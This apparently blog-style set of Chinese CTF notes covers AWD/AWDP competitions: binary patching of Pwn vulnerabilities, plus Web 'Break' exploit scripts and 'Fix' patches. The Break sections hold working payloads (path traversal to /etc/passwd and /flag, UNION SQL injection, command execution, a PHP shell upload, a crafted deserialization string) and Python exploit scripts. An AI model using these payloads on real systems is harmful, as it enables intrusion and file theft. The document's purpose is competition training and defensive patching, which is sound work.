---
title: "AWD / AWDP 攻防"
slug: "awd-awdp-patch-notes"
date: "2026-07-13"
excerpt: "整理 AWD / AWDP 比赛中 Pwn 漏洞修补、通用 Patch 技巧、工具使用与验证流程。"
category: "competition-summary"
subcategory: "awd-awdp"
image: "/anime-melancholy.png"
heroImage: "/article-hero-bg.png"
---

# 1.AWDP
## AWDP-PWN
“核心原则 → 常见漏洞修补 → 通用 Patch 技巧 → 工具 → 验证清单”

AWDP / CTF Pwn Patch 常见修补思路整理

在 AWDP 比赛中，Pwn 题的修补不仅要求修复漏洞，还要求尽量不改变程序原有逻辑，避免断掉 Check。

与传统 AWD 相比，AWDP 通常会有更严格的自动化测试脚本，

因此 Patch 的目标是：**修掉漏洞，同时保持程序功能、交互逻辑、返回值和原始行为尽可能不变。**

### 一、Patch 的核心原则
#### 1. 保持偏移不变
尽量使用等长替换，不改变文件大小、函数偏移和代码段布局。

否则可能导致：

+ 程序崩溃
+ 跳转地址错乱
+ PLT/GOT 引用异常
+ Check 脚本失败

#### 2. 就地修补
优先修改已有指令、立即数、跳转条件，而不是大规模重写逻辑。

常见方式：

+ 修改输入长度
+ 修改比较常数
+ 修改跳转条件
+ 替换危险函数调用
+ NOP 掉危险分支

#### 3. NOP 填充
删除或绕过无用代码时，用 `0x90` 填充空隙，保持原始指令长度不变。

#### 4. 保持业务逻辑
不要为了修漏洞直接禁用核心功能。

例如：

+ 不建议直接 NOP 掉整个输入逻辑
+ 不建议直接退出程序
+ 不建议破坏菜单流程
+ 不建议删除正常输出

---

### 二、常见漏洞类型与修补方式
---

#### 1. 栈溢出 Stack Overflow
栈溢出通常由输入长度大于缓冲区大小导致。

#### 常见漏洞场景
```c
char buf[0x20];
read(0, buf, 0x100);
```

这里 `buf` 只有 `0x20` 字节，但 `read` 读取了 `0x100` 字节。

#### 修补思路
核心是限制输入长度。

#### 可修改点
#### 修改 `read` 长度参数
例如：

```plain
mov edx, 0x100
```

改为：

```plain
mov edx, 0x20
```

如果实际缓冲区是 `0x20`，就把读取长度改成 `0x20` 或更小。

#### 修改 `fgets` 长度参数
如果原逻辑类似：

```c
fgets(buf, 0x100, stdin);
```

而 `buf` 只有 `0x40`，则将长度改为：

```c
fgets(buf, 0x40, stdin);
```

#### 修改 `scanf("%s")`
危险写法：

```c
scanf("%s", buf);
```

可以改为：

```c
scanf("%15s", buf);
```

具体长度根据缓冲区大小决定。

#### 修改 `memcpy` / `memmove` 长度
如果存在：

```c
memcpy(dst, src, 0x100);
```

但 `dst` 实际只有 `0x40`，则将长度立即数改小。

#### 修改比较条件
例如原本检查：

```plain
cmp rax, 0x100
```

可以改为：

```plain
cmp rax, 0x20
```

---

#### 2. 格式化字符串漏洞 Format String
格式化字符串漏洞通常出现在：

```c
printf(buf);
```

而不是：

```c
printf("%s", buf);
```

### 修补思路
让用户输入只作为普通字符串输出，而不是格式化字符串。

### 可修改点
#### 方法一：`printf` 改为 `puts`
如果逻辑允许，可以直接将：

```c
printf(buf);
```

改为：

```c
puts(buf);
```

优点：

+ 修改简单
+ 不再解析 `%x`、`%p`、`%n` 等格式化符号
+ 通常比较稳定

缺点：

+ `puts` 会自动添加换行
+ 如果 Check 对输出格式极其严格，可能影响结果

#### 方法二：改为 `printf("%s", buf)`
理想修复方式是：

```c
printf("%s", buf);
```

但二进制 Patch 中通常需要额外传入 `"%s"` 地址，可能涉及：

+ 修改寄存器
+ 修改栈参数
+ 在空白区域写入 `"%s\x00"`
+ 使用 RIP 相对寻址
+ 跳转到补丁区执行新逻辑

#### 方法三：NOP 掉危险调用
如果该输出不影响核心逻辑，可以直接 NOP 掉：

```plain
call printf
```

但这种方法风险较高，可能影响 Check 输出。

---

#### 3. 堆漏洞 Heap Vulnerabilities
堆漏洞通常比栈溢出更复杂，常见类型包括：

+ UAF
+ Heap Overflow
+ Double Free
+ Off-by-one
+ 越界写

---

#### 3.1 UAF：Use After Free
漏洞场景：

```c
free(ptr);
use(ptr);
```

### 修补思路
`free` 后立即清空原始指针。

```c
free(ptr);
ptr = NULL;
```

### Patch 重点
注意：不是清空 `rax` 或 `rdi`，而是清空保存指针的内存位置。

例如：

```plain
mov qword ptr [rbp-0x10], 0
```

如果原始指针存储在 `[rbp-0x10]`，就在 `free` 后将其置零。

### 替代方案
#### NOP 掉 `free`
```plain
call free
```

改成 NOP。

这种方式可以避免 UAF，但风险较高：

+ 可能造成内存泄露
+ 可能影响程序逻辑
+ Check 可能检测释放逻辑

#### `malloc` 改为 `calloc`
如果漏洞依赖未初始化内存，可以考虑将 `malloc` 改为 `calloc`。

但这通常需要调整参数，不一定适合快速 Patch。

---

#### 3.2 Heap Overflow
漏洞场景：

```c
ptr = malloc(0x20);
read(0, ptr, 0x100);
```

### 修补方式
将 `read` 长度改小：

```plain
mov edx, 0x100
```

改为：

```plain
mov edx, 0x20
```

核心原则：

`malloc` 多大，输入长度最多就给多大。

---

#### 3.3 Off-by-one
漏洞场景：

```c
for (i = 0; i <= size; i++)
```

这里多写了 1 字节。

### 修补方式
#### 修改跳转条件
例如：

```plain
jle
```

改为：

```plain
jl
```

#### 修改比较常数
例如：

```plain
cmp eax, 0x20
```

改为：

```plain
cmp eax, 0x1f
```

---

#### 4. 整数溢出 Integer Overflow
整数溢出常见于大小计算、数组索引、长度判断。

### 漏洞场景
```c
if (a + b < 10) {
    read(0, buf, a + b);
}
```

如果 `a + b` 溢出，可能绕过判断。

### 修补方式
#### 修改有符号 / 无符号跳转
常见跳转：

```plain
jl
jle
jg
jge
```

可以根据逻辑改成：

```plain
jb
jbe
ja
jae
```

或者反过来。

### 常见修补点
#### 增加负数检查
```plain
cmp rax, 0
jl reset
```

#### 增加上限检查
```plain
cmp rdx, 0x100
jg error
```

#### 修改边界判断
例如：

```plain
cmp eax, 0x100
```

改为：

```plain
cmp eax, 0x20
```

---

#### 5. 索引越界
索引越界常见于菜单题、数组管理题、堆题。

### 漏洞场景
```c
chunks[index]
```

但没有检查 `index` 范围。

### 修补方式
增加边界检查：

```plain
cmp dword ptr [rbp-8], 0
jl reset_to_0

cmp dword ptr [rbp-8], 7
jg reset_to_7
```

如果空间不足，可以使用 Hook 跳到空白区域执行检查逻辑，再跳回原逻辑。

---

### 6. 后门与危险函数
有些题目会直接存在危险调用：

```c
system("/bin/sh");
```

### 修补方式
#### 修改字符串
将：

```plain
/bin/sh
```

改为：

```plain
/bin/ls
```

或改为空字符串。

#### NOP 掉调用
将：

```plain
call system
```

改成 NOP。

#### 修改跳转逻辑
例如原本满足条件后进入后门：

```plain
jz backdoor
```

可以改为：

```plain
jnz backdoor
```

或者直接跳到正常流程：

```plain
jmp normal_exit
```

---

### 三、通用 Patch 技巧
---

#### 1. 修改立即数
这是最常用、最稳定的 Patch 方式。

可修改内容包括：

+ 输入长度
+ 比较边界
+ 数组大小
+ malloc 大小
+ memcpy 长度
+ flag 值
+ magic number
+ 偏移值

示例：

```plain
mov edx, 0x100
```

改为：

```plain
mov edx, 0x20
```

---

#### 2. 修改跳转条件
常见操作：

| 原指令 | 可改为 | 用途 |
| --- | --- | --- |
| `je` | `jne` | 反转判断 |
| `jne` | `je` | 反转判断 |
| `jle` | `jl` | 修 Off-by-one |
| `jl` | `jb` | 有符号改无符号 |
| `jg` | `ja` | 有符号改无符号 |
| 条件跳转 | `jmp` | 强制跳转 |
| 条件跳转 | NOP | 取消跳转 |


---

#### 3. 替换函数调用
常见替换：

| 危险函数 | 替换方向 |
| --- | --- |
| `gets` | `fgets`<br/> / `read` |
| `printf(buf)` | `puts(buf)` |
| `strcpy` | `strncpy` |
| `sprintf` | `snprintf` |
| `malloc` | `calloc` |
| `system` | NOP / 改字符串 |


注意：函数替换通常涉及参数数量和调用约定，不一定能直接替换。

---

#### 4. NOP 填充
适用于：

+ 删除危险调用
+ 删除后门逻辑
+ 删除多余判断
+ 填补等长替换后的剩余字节

x86/x64 下 NOP 通常是：

```plain
0x90
```

---

#### 5. Hooking：跳转到空白区修补
当原位置空间不足时，可以使用 Hook。

### 基本流程
1. 找到漏洞位置
2. 找到可写补丁的空白区域，例如 `.eh_frame`、代码段末尾 Padding
3. 在漏洞位置写入 `jmp patch_area`
4. 在空白区域写修复逻辑
5. 修复逻辑执行完后 `jmp back`

### 适用场景
+ 需要插入多条检查指令
+ 需要保存和恢复寄存器
+ 需要新增格式化字符串
+ 需要清空指针
+ 需要复杂边界检查

---

### 四、常用工具
| 工具 | 用途 |
| --- | --- |
| IDA Pro | 反汇编分析、定位漏洞点 |
| Keypatch | 在 IDA 中直接写汇编 Patch |
| 010 Editor | 十六进制编辑 ELF 字节 |
| Ghex | Linux 下十六进制编辑 |
| patchelf | 修改 ELF 动态链接、RPATH 等 |
| checksec | 查看二进制保护机制 |
| LIEF | 用 Python 解析和修改 ELF / PE |
| AwdPwnPatcher | 自动化 Pwn Patch 辅助工具 |


---

### 五、Keypatch 常用操作
### 打开 Keypatch
快捷键：

```plain
Ctrl + Alt + K
```

### 常用功能
| 功能 | 作用 |
| --- | --- |
| Assemble | 输入汇编并生成机器码 |
| Patch bytes | 直接修改字节 |
| Fill with NOPs | 用 NOP 填充选中区域 |
| Undo | 撤销修改 |
| Apply patches to input file | 保存修改到原二进制文件 |


### 使用建议
优先使用等长替换。

例如原指令：

```plain
mov edx, 0x100
```

改为：

```plain
mov edx, 0x20
```

这种修改通常最稳。

---

### 六、常见漏洞 Patch 对照表
| 漏洞类型 | 常见原因 | 推荐修补方式 |
| --- | --- | --- |
| 栈溢出 | 输入长度过大 | 修改 `read`<br/> / `fgets`<br/> / `scanf`<br/> 长度 |
| 堆溢出 | 读取长度大于堆块大小 | 修改输入长度或 malloc 大小 |
| 格式化字符串 | `printf(buf)` | 改为 `puts(buf)`<br/> 或 `printf("%s", buf)` |
| UAF | free 后继续使用 | free 后将原始指针置 NULL |
| Double Free | 重复释放同一指针 | free 后清空指针或增加状态判断 |
| Off-by-one | 边界多写 1 字节 | 修改 `jle`<br/> 为 `jl`<br/>，或修改比较常数 |
| 整数溢出 | size 计算绕过 | 增加范围检查，修改跳转逻辑 |
| 索引越界 | index 未校验 | 增加上下界判断 |
| 后门 | `system("/bin/sh")` | NOP 调用、改字符串、改跳转 |
| 信息泄露 | 输出敏感地址 | 删除输出、改格式化输出、限制打印 |


---

### 七、Patch 后验证清单
Patch 完成后必须验证，否则可能导致服务崩溃或 Check 失败。

| 检查项 | 验证目的 |
| --- | --- |
| 文件权限 | 确认二进制仍有 `+x`<br/> 权限 |
| checksec | 确认保护机制没有异常变化 |
| 反汇编检查 | 确认 Patch 后指令没有错位 |
| 本地运行 | 确认程序可以正常启动 |
| 功能测试 | 确认菜单、输入、输出逻辑正常 |
| 漏洞验证 | 确认原 Exp 或触发方式失效 |
| Check 测试 | 确认平台 Check 不会失败 |
| MD5 / SHA256 | 确认部署的是修补后的文件 |
| 远程部署 | 确认权限、路径、服务重启正常 |


---

### 八、推荐操作流程
#### Step 1：备份原文件
```bash
cp pwn pwn.bak
```

---

#### Step 2：查看保护
```bash
checksec ./pwn
```

关注：

+ Canary
+ NX
+ PIE
+ RELRO
+ Stack executable

---

#### Step 3：定位漏洞点
使用：

+ IDA Pro
+ GDB
+ pwndbg
+ strings
+ objdump
+ readelf

重点找：

+ `read`
+ `gets`
+ `scanf`
+ `printf`
+ `memcpy`
+ `strcpy`
+ `free`
+ `malloc`
+ `system`

---

#### Step 4：选择 Patch 方式
优先级建议：

1. 改立即数
2. 改跳转条件
3. 替换函数调用
4. NOP 危险逻辑
5. Hook 到空白区域写补丁

---

#### Step 5：保存 Patch
在 IDA + Keypatch 中：

```plain
Edit → Patch program → Apply patches to input file
```

---

#### Step 6：本地验证
测试：

+ 正常输入是否可用
+ 菜单功能是否正常
+ 原漏洞是否无法触发
+ 程序是否会异常退出

---

#### Step 7：部署上线
确保：

```bash
chmod +x ./pwn
```

然后重启服务。

---

### 九、实战优先级建议
比赛中时间有限，建议优先处理最容易被打的点：

1. `system("/bin/sh")` 后门
2. 明显栈溢出
3. 格式化字符串
4. UAF / Double Free
5. Heap Overflow
6. Off-by-one
7. 整数溢出
8. 逻辑漏洞

最稳的 Patch 通常是：

**改长度、改判断、改跳转、清指针。**

最容易断 Check 的 Patch 通常是：

**删除整个功能、直接退出程序、破坏输出格式、改变菜单流程。**

****

# AWDP-WEB
**AWDP Web 手现场核心是两条线：**

```plain
Break：把题目打通，拿 flag / 攻击分
Fix：提交补丁，让平台的检测 payload 打不通，拿防御分
```

# **一、AWDP Web 手拿到题后先看什么**
**一般会拿到这些东西之一：**

```plain
1. 源码压缩包
2. Dockerfile / docker-compose.yml
3. 题目访问地址
4. patch 提交入口
5. flag 提交入口
6. Fix 检测结果
```

**Web 手的第一步不是扫全网，也不是打别人，而是：**

```plain
本地跑起来 → 找漏洞 → Break 拿 flag → 写 patch → 提交 Fix → 看检测结果 → 继续迭代
```

**本地目录可以这样整理：**

```bash
mkdir awdp_web
cd awdp_web

mkdir src
mkdir backup
mkdir exploit
mkdir patch
mkdir notes
```

**源码先备份：**

```bash
cp -r 题目源码 src_origin
cp -r 题目源码 src_work
tar -czf backup/src_origin.tar.gz src_origin
```

**如果有 Docker：**

```bash
cd src_work
docker compose up -d
docker ps
```

**或者：**

```bash
docker build -t awdp-web .
docker run -it -p 8080:80 awdp-web
```

**本地访问：**

```bash
curl http://127.0.0.1:8080/
```

---

# **二、AWDP Web 手的实际工作顺序**
**你不要一开始就细看业务，按这个顺序来：**

```plain
1. 找路由
2. 找输入点
3. 搜危险函数
4. 找 flag 位置
5. 本地复现漏洞
6. 写 Break 脚本
7. 写 Fix 补丁
8. 本地验证漏洞失效、业务正常
9. 提交平台
```

---

# **三、先快速扫源码**
**进入源码：**

```bash
cd src_work
```

## **1. 看项目类型**
```bash
ls
find . -maxdepth 2 -type f
```

**看到这些就是 PHP：**

```plain
index.php
composer.json
ThinkPHP
Laravel
```

**看到这些就是 Python：**

```plain
app.py
requirements.txt
manage.py
flask
django
```

**看到这些就是 Node：**

```plain
package.json
app.js
server.js
routes/
```

**看到这些就是 Java：**

```plain
pom.xml
src/main/java
WEB-INF
SpringBoot
```

---

## **2. 快速搜输入点**
```bash
grep -R "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\$_FILES" . 2>/dev/null
```

**Python：**

```bash
grep -R "request.args\|request.form\|request.values\|request.json\|request.files" . 2>/dev/null
```

**Node：**

```bash
grep -R "req.query\|req.body\|req.params\|req.cookies\|req.files" . 2>/dev/null
```

**Java：**

```bash
grep -R "getParameter\|@RequestParam\|@PathVariable\|@RequestBody" . 2>/dev/null
```

---

## **3. 快速搜高危函数**
**PHP：**

```bash
grep -R "eval\|assert\|system\|exec\|shell_exec\|passthru\|proc_open\|popen" . 2>/dev/null
grep -R "include\|require\|file_get_contents\|fopen\|readfile\|highlight_file" . 2>/dev/null
grep -R "unserialize\|__destruct\|__wakeup\|__toString" . 2>/dev/null
grep -R "move_uploaded_file\|\$_FILES" . 2>/dev/null
```

**Python：**

```bash
grep -R "eval\|exec\|os.system\|subprocess\|pickle.loads\|yaml.load\|render_template_string" . 2>/dev/null
```

**Node：**

```bash
grep -R "eval\|child_process\|exec\|spawn\|require(.*req\|deserialize\|merge\|lodash" . 2>/dev/null
```

**Java：**

```bash
grep -R "Runtime.getRuntime\|ProcessBuilder\|readObject\|ObjectInputStream\|TemplatesImpl\|ScriptEngine" . 2>/dev/null
```

**SQL：**

```bash
grep -R "select \|SELECT \|insert \|INSERT \|update \|UPDATE \|delete \|DELETE " . 2>/dev/null
```

**模板：**

```bash
grep -R "render_template_string\|Template\|twig\|freemarker\|velocity\|jinja" . 2>/dev/null
```

---

# **四、Break 实际怎么打**
**AWDP 的 Break 就是：你找到漏洞，把题目打通，拿到 flag。**

**不是传统 AWD 那种一直打别的队。AWDP 里更多是打平台给你的题目靶机 / GameBox / Challenge 服务，然后提交 flag 或 payload。**

## **1. 文件读取类 Break**
**假设源码里看到：**

```php
$file = $_GET['file'];
echo file_get_contents($file);
```

**你先本地试：**

```bash
curl "http://127.0.0.1:8080/download.php?file=/flag"
curl "http://127.0.0.1:8080/download.php?file=../../../../flag"
curl "http://127.0.0.1:8080/download.php?file=/etc/passwd"
```

**如果平台题目地址是：**

```plain
http://challenge.example.com:port
```

**就换成远程：**

```bash
curl "http://challenge.example.com:port/download.php?file=/flag"
```

**写 Break 脚本：**

```python
import requests
import re

url = "http://challenge.example.com:port/download.php"

payloads = [
    "/flag",
    "/flag.txt",
    "../../../../flag",
    "../../../../flag.txt",
    "/home/ctf/flag",
]

for p in payloads:
    try:
        r = requests.get(url, params={"file": p}, timeout=5)
        flags = re.findall(r"flag\{.*?\}", r.text)
        if flags:
            print("[+] payload:", p)
            print("[+] flag:", flags[0])
            break
    except Exception as e:
        pass
```

---

## **2. 文件包含类 Break**
**危险代码：**

```php
include $_GET['page'];
```

**先试：**

```bash
curl "http://127.0.0.1:8080/index.php?page=../../../../flag"
curl "http://127.0.0.1:8080/index.php?page=php://filter/read=convert.base64-encode/resource=index.php"
```

**如果能读源码：**

```bash
curl "http://127.0.0.1:8080/index.php?page=php://filter/read=convert.base64-encode/resource=config.php"
```

**拿到 base64 后解：**

```bash
echo "base64内容" | base64 -d
```

**常见目标文件：**

```plain
config.php
db.php
conn.php
.env
app.py
settings.py
application.yml
```

---

## **3. SQL 注入类 Break**
**看到这种：**

```php
$id = $_GET['id'];
$sql = "select * from news where id=$id";
```

**先手工测：**

```bash
curl "http://127.0.0.1:8080/news.php?id=1"
curl "http://127.0.0.1:8080/news.php?id=1'"
curl "http://127.0.0.1:8080/news.php?id=1 and 1=1"
curl "http://127.0.0.1:8080/news.php?id=1 and 1=2"
```

**判断有回显后尝试 union：**

```bash
curl "http://127.0.0.1:8080/news.php?id=-1 union select 1,2,3"
```

**如果 flag 表叫 **`**flag**`**：**

```bash
curl "http://127.0.0.1:8080/news.php?id=-1 union select 1,flag,3 from flag"
```

**脚本：**

```python
import requests
import re

base = "http://challenge.example.com:port/news.php"

payloads = [
    "-1 union select 1,flag,3 from flag",
    "-1 union select 1,group_concat(flag),3 from flag",
    "-1 union select 1,group_concat(table_name),3 from information_schema.tables",
]

for payload in payloads:
    r = requests.get(base, params={"id": payload}, timeout=5)
    flags = re.findall(r"flag\{.*?\}", r.text)
    if flags:
        print(flags[0])
        break
```

---

## **4. 命令执行类 Break**
**看到这种：**

```php
system($_GET['cmd']);
```

**本地验证：**

```bash
curl "http://127.0.0.1:8080/api.php?cmd=id"
curl "http://127.0.0.1:8080/api.php?cmd=cat /flag"
```

**脚本：**

```python
import requests
import re

url = "http://challenge.example.com:port/api.php"

cmds = [
    "cat /flag",
    "cat /flag.txt",
    "cat /home/ctf/flag",
]

for cmd in cmds:
    r = requests.get(url, params={"cmd": cmd}, timeout=5)
    flags = re.findall(r"flag\{.*?\}", r.text)
    if flags:
        print(flags[0])
        break
```

---

## **5. 上传类 Break**
**看到：**

```php
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
```

**先测试上传普通文件：**

```bash
echo test > a.txt
curl -F "file=@a.txt" http://127.0.0.1:8080/upload.php
```

**看返回路径：**

```plain
/uploads/a.txt
```

**如果能上传 PHP，在 CTF 靶机内测试：**

```bash
echo '<?php echo file_get_contents("/flag"); ?>' > a.php
curl -F "file=@a.php" http://127.0.0.1:8080/upload.php
curl http://127.0.0.1:8080/uploads/a.php
```

**Break 脚本：**

```python
import requests
import re

base = "http://challenge.example.com:port"

files = {
    "file": ("a.php", b'<?php echo file_get_contents("/flag"); ?>', "application/x-php")
}

r = requests.post(base + "/upload.php", files=files, timeout=5)

paths = [
    "/uploads/a.php",
    "/upload/a.php",
    "/static/uploads/a.php",
]

for path in paths:
    res = requests.get(base + path, timeout=5)
    flags = re.findall(r"flag\{.*?\}", res.text)
    if flags:
        print(flags[0])
        break
```

---

## **6. 反序列化类 Break**
**看到：**

```php
$data = unserialize($_POST['data']);
```

**你要找同目录里的魔术方法：**

```bash
grep -R "__destruct\|__wakeup\|__toString\|__call" . 2>/dev/null
```

**比如看到：**

```php
class ReadFile {
    public $file;

    function __destruct() {
        echo file_get_contents($this->file);
    }
}
```

**构造 payload：**

```php
<?php
class ReadFile {
    public $file = "/flag";
}

echo serialize(new ReadFile());
```

**生成：**

```bash
php gen.php
```

**提交：**

```bash
curl -X POST http://127.0.0.1:8080/index.php \
  -d 'data=O:8:"ReadFile":1:{s:4:"file";s:5:"/flag";}'
```

---

## **7. SSTI 类 Break**
**Flask/Jinja 常见危险点：**

```python
return render_template_string(request.args.get("name"))
```

**本地测：**

```bash
curl "http://127.0.0.1:8080/?name={{7*7}}"
```

**如果返回 **`**49**`**，说明模板被执行。**

**然后读配置、读文件。CTF 中常见思路是先确认模板执行，再找可用对象链。**

**Fix 时不要只过滤 **`**{**`**，因为很容易绕；要改成普通字符串输出或者固定模板变量。**

---

# **五、Fix 实际怎么做**
**AWDP 的 Fix 不是“把服务关了”，而是：**

```plain
让平台攻击 payload 失效
同时让正常业务和 check 通过
然后提交 patch
```

**Fix 一般比 Break 更容易拿分，很多比赛建议同一题如果 Break 和 Fix 同时开放，优先把明显洞 Fix 掉。(**[**CSDN**](https://blog.csdn.net/Jayjay___/article/details/142147255?utm_source=chatgpt.com)**)**

---

## **1. 文件读取 Fix**
**漏洞代码：**

```php
$file = $_GET['file'];
echo file_get_contents($file);
```

**修：**

```php
$base = __DIR__ . "/downloads/";
$name = basename($_GET['file'] ?? "");

$path = realpath($base . $name);

if ($path === false || strpos($path, realpath($base)) !== 0) {
    die("bad file");
}

echo file_get_contents($path);
```

**如果业务只是下载固定文件，更稳：**

```php
$allow = [
    "manual.pdf" => __DIR__ . "/downloads/manual.pdf",
    "readme.txt" => __DIR__ . "/downloads/readme.txt",
];

$name = $_GET['file'] ?? "";

if (!isset($allow[$name])) {
    die("bad file");
}

readfile($allow[$name]);
```

---

## **2. 文件包含 Fix**
**漏洞代码：**

```php
include $_GET['page'];
```

**修成白名单：**

```php
$allow = [
    "home" => "home.php",
    "about" => "about.php",
    "help" => "help.php",
];

$page = $_GET['page'] ?? "home";

if (!isset($allow[$page])) {
    die("bad page");
}

include __DIR__ . "/" . $allow[$page];
```

---

## **3. SQL 注入 Fix**
**漏洞代码：**

```php
$id = $_GET['id'];
$sql = "select * from news where id=$id";
```

**临时快修：**

```php
$id = intval($_GET['id']);
$sql = "select * from news where id=$id";
```

**更正规：**

```php
$stmt = $pdo->prepare("select * from news where id = ?");
$stmt->execute([$_GET['id']]);
$data = $stmt->fetchAll();
```

**字符串参数：**

```php
$name = $_GET['name'] ?? "";
$stmt = $pdo->prepare("select * from users where name = ?");
$stmt->execute([$name]);
```

---

## **4. 命令执行 Fix**
**漏洞代码：**

```php
system($_GET['cmd']);
```

**如果业务不需要：**

```php
die("disabled");
```

**如果业务需要执行固定命令：**

```php
$allow = [
    "date" => "date",
    "uptime" => "uptime",
];

$action = $_GET['action'] ?? "";

if (!isset($allow[$action])) {
    die("bad action");
}

system($allow[$action]);
```

**不要这样修：**

```php
$cmd = str_replace("cat", "", $_GET['cmd']);
system($cmd);
```

**这种黑名单很容易被绕。**

---

## **5. 上传 Fix**
**漏洞代码：**

```php
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
```

**修：**

```php
$allow = ["jpg", "jpeg", "png", "gif", "txt"];

$name = $_FILES["file"]["name"];
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));

if (!in_array($ext, $allow)) {
    die("bad ext");
}

$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES["file"]["tmp_name"]);

$allowMime = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "text/plain",
];

if (!in_array($mime, $allowMime)) {
    die("bad mime");
}

$newName = md5_file($_FILES["file"]["tmp_name"]) . "." . $ext;
move_uploaded_file($_FILES["file"]["tmp_name"], __DIR__ . "/uploads/" . $newName);
```

**还要禁止上传目录执行 PHP。**

**Nginx：**

```nginx
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}
```

**Apache：**

```plain
php_flag engine off
RemoveHandler .php .phtml .php5
```

---

## **6. 反序列化 Fix**
**漏洞代码：**

```php
$data = unserialize($_POST['data']);
```

**能删就删：**

```php
die("disabled");
```

**能改 JSON 就改：**

```php
$data = json_decode($_POST['data'], true);
```

**至少这样：**

```php
$data = unserialize($_POST['data'], ["allowed_classes" => false]);
```

**如果必须允许某个类：**

```php
$data = unserialize($_POST['data'], ["allowed_classes" => ["SafeClass"]]);
```

---

## **7. SSTI Fix**
**危险代码：**

```python
return render_template_string(request.args.get("name"))
```

**修：**

```python
from flask import render_template

name = request.args.get("name", "")
return render_template("index.html", name=name)
```

**模板中：**

```html
{{ name }}
```

**不要把用户输入当模板字符串渲染。**

---

## **8. Node 原型链污染 Fix**
**看到这种：**

```plain
merge(target, req.body)
```

**或者：**

```plain
_.merge(obj, req.body)
```

**要过滤：**

```plain
function clean(obj) {
  for (let key in obj) {
    if (key === "__proto__" || key === "constructor" || key === "prototype") {
      delete obj[key]
    } else if (typeof obj[key] === "object" && obj[key] !== null) {
      clean(obj[key])
    }
  }
  return obj
}

req.body = clean(req.body)
```

---

# **六、AWDP Web 手提交 Fix 前怎么自测**
**你不能只修代码，必须本地测两件事：**

```plain
1. 原来的攻击 payload 失效
2. 正常页面还能用
```

**比如文件读取修完后：**

```bash
curl "http://127.0.0.1:8080/download.php?file=../../../../flag"
```

**应该返回：**

```plain
bad file
```

**正常业务：**

```bash
curl "http://127.0.0.1:8080/download.php?file=readme.txt"
```

**应该正常返回。**

**SQL 注入修完后：**

```bash
curl "http://127.0.0.1:8080/news.php?id=1%20and%201=1"
curl "http://127.0.0.1:8080/news.php?id=1%27"
```

**不能报数据库错误，不能返回异常数据。**

**上传修完后：**

```bash
echo '<?php phpinfo(); ?>' > a.php
curl -F "file=@a.php" http://127.0.0.1:8080/upload.php
```

**应该返回：**

```plain
bad ext
```

---

# **七、AWDP Web 手怎么做 patch**
**平台通常要求你提交：**

```plain
1. 修改后的源码文件
2. patch diff
3. 整个源码压缩包
4. 在线编辑补丁
```

**你本地建议用 git 管理：**

```bash
cd src_work
git init
git add .
git commit -m "origin"
```

**修完后看改动：**

```bash
git diff
```

**生成 patch：**

```bash
git diff > ../patch/fix.patch
```

**如果平台要 zip：**

```bash
zip -r ../patch/fix.zip .
```

**提交之前确认没有把 flag、临时脚本、备份源码一起打进去：**

```bash
find . -type f | grep -Ei "flag|backup|exp|exploit|test|payload|tmp"
```

---

# **八、AWDP Web 手 Break 脚本怎么写**
**建议每道题一个目录：**

```plain
exploit/
  web1_exp.py
  web2_exp.py
  web3_exp.py
```

**通用模板：**

```python
import requests
import re

BASE = "http://challenge.example.com:port"

def get_flag(text):
    flags = re.findall(r"flag\{.*?\}", text)
    return flags[0] if flags else None

def attack():
    url = BASE + "/vuln.php"
    r = requests.get(url, params={
        "file": "/flag"
    }, timeout=5)

    flag = get_flag(r.text)
    if flag:
        print("[+] flag:", flag)
        return flag

if __name__ == "__main__":
    attack()
```

**如果平台有提交接口：**

```python
def submit(flag):
    submit_url = "http://platform.example.com/api/submit"
    token = "你的token"

    r = requests.post(
        submit_url,
        data={"flag": flag},
        headers={"Authorization": token},
        timeout=5
    )

    print(r.text)
```

**组合：**

```python
flag = attack()
if flag:
    submit(flag)
```

---

# **九、AWDP Web 手比赛时的优先级**
**如果 Break 和 Fix 同时开放，Web 手优先级建议是：**

```plain
1. 先看明显 RCE / 文件读取 / 上传 / SQL 注入
2. 能 Break 就立刻写脚本拿攻击分
3. 同一个漏洞马上写 Fix
4. Fix 本地验证
5. 提交 patch
6. 看平台检测结果
7. 如果 Fix 失败，根据检测反馈继续改
```

**实际节奏：**

```plain
看到漏洞 → 本地打通 → 远程打通 → 保存 payload → 写补丁 → 本地确认 payload 失效 → 提交 Fix
```

**不要只顾 Break。AWDP 里 Fix 分很重要，而且有时比 Break 更容易拿。(**[**CSDN**](https://blog.csdn.net/Jayjay___/article/details/142147255?utm_source=chatgpt.com)**)**

---

# **十、AWDP 和传统 AWD 的 Web 手操作差别**
**你可以这样记：**

```plain
AWD Web 手：
看自己日志、守自己机器、攻击其他队机器、批量交 flag。

AWDP Web 手：
解平台题目拿 Break 分，提交补丁拿 Fix 分，重点是 payload 和 patch。
```

**AWDP 里面你更需要保存两样东西：**

```plain
1. Break payload / exp
2. Fix patch / diff
```

**每道题笔记建议这样写：**

```plain
题目：web1
漏洞点：download.php 的 file 参数任意文件读取
Break payload：/download.php?file=/flag
flag 路径：/flag
Fix 文件：download.php
Fix 方法：basename + realpath 限制目录
本地验证：
  - /download.php?file=/flag => bad file
  - /download.php?file=readme.txt => 正常
平台结果：Fix 通过
```

---

# **十一、Web 手最实用的一套命令**
**源码审计：**

```bash
grep -R "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\$_FILES" . 2>/dev/null
grep -R "eval\|assert\|system\|exec\|shell_exec\|passthru" . 2>/dev/null
grep -R "include\|require\|file_get_contents\|fopen\|readfile" . 2>/dev/null
grep -R "unserialize\|__destruct\|__wakeup" . 2>/dev/null
grep -R "move_uploaded_file\|\$_FILES" . 2>/dev/null
grep -R "SELECT\|INSERT\|UPDATE\|DELETE" . 2>/dev/null
```

**启动环境：**

```bash
docker compose up -d
docker ps
curl http://127.0.0.1:8080/
```

**生成 patch：**

```bash
git diff > fix.patch
```

**打包：**

```bash
zip -r fix.zip .
```

**查误打包：**

```bash
find . -type f | grep -Ei "flag|backup|exploit|payload|tmp"
```

---

# **十二、一句话版**
**AWDP Web 手实际干的不是“守服务器互打”，而是：**

```plain
